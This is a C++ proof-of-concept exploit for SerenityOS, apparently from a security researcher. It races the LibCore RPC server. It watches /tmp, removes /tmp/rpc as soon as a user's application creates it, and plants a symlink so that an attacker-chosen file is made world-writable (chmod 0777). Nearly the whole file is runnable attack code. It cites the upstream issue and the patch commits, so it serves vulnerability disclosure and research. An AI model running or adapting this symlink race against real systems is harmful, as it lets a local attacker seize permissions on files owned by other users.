/*
 * Copyright (c) 2021, the SerenityOS developers.
 *
 * SPDX-License-Identifier: BSD-2-Clause
 */

// LibCore::EventLoop::start_rpc_server RPC race arbitrary chmod
// ---
// Race RPC server when a user opens a GUI application
// (or any application which uses LibCore::EventLoop)
// to chmod 0777 an arbitrary file.
// The race window is extremely precise.
// ---
// Details:
// - https://github.com/SerenityOS/serenity/issues/4876
// Patch:
// - https://github.com/SerenityOS/serenity/commit/d38b9916c99543a40d0c297ac92815f2ad1a7508
// - https://github.com/SerenityOS/serenity/commit/f152b6f7ed60b02f603b8a3de89ed45074a9fa63
// ---
// ~ bcoles 2021

// target_link_libraries(libcore-rpc-race-arbitrary-chmod LibCore)

#include <AK/String.h>
#include <LibCore/ArgsParser.h>
#include <LibCore/DirectoryWatcher.h>
#include <LibCore/DirIterator.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>

// from Userland/rm.cpp:
static int remove(bool recursive, bool force, String path)
{
    struct stat path_stat;
    if (lstat(path.characters(), &path_stat) < 0) {
        if (!force)
            perror("lstat");
        return force ? 0 : 1;
    }

    if (S_ISDIR(path_stat.st_mode) && recursive) {
        auto di = Core::DirIterator(path, Core::DirIterator::SkipParentAndBaseDir);
        if (di.has_error()) {
            if (!force)
                fprintf(stderr, "DirIterator: %s\n", di.error_string());
            return 1;
        }

        while (di.has_next()) {
            int s = remove(true, force, di.next_full_path());
            if (s != 0 && !force)
                return s;
        }

        int s = rmdir(path.characters());
        if (s < 0 && !force) {
            perror("rmdir");
            return 1;
        }
    } else {
        int rc = unlink(path.characters());
        if (rc < 0 && !force) {
            perror("unlink");
            return 1;
        }
    }
    return 0;
}

int main(int argc, char** argv)
{
    outln("RPC Race Arbitrary chmod()");

    const char* target_file = nullptr;

    Core::ArgsParser args_parser;
    args_parser.add_option(target_file, "File to chmod", nullptr, 'f', "file");
    args_parser.parse(argc, argv);

    if (target_file == nullptr) {
        outln("Must specify a file to chmod (-f)");
        return 1;
    }

    auto watch_path = "/tmp/rpc";

    outln("Setting up watcher for {} ...", watch_path);
    auto watcher = Core::DirectoryWatcher("/tmp");

    while (true) {
        outln("Removing {} ...", watch_path);
        remove(true, true, watch_path);

        outln("Waiting for a user to create a RPC socket ...");
        auto event = watcher.wait_for_event();
        if (event.has_value()) {
            auto child_path = event.value().child_path;
            //dbgln("EVENT: {}", child_path);
            if (child_path.equals_ignoring_case(watch_path)) {
                //outln("{} created. Let's go!", child_path);
                if (rmdir(watch_path) == -1)
                    continue;
                symlink(target_file, watch_path);
                sleep(1);
            }
        }
    }

    outln("Done");

    return 0;
}

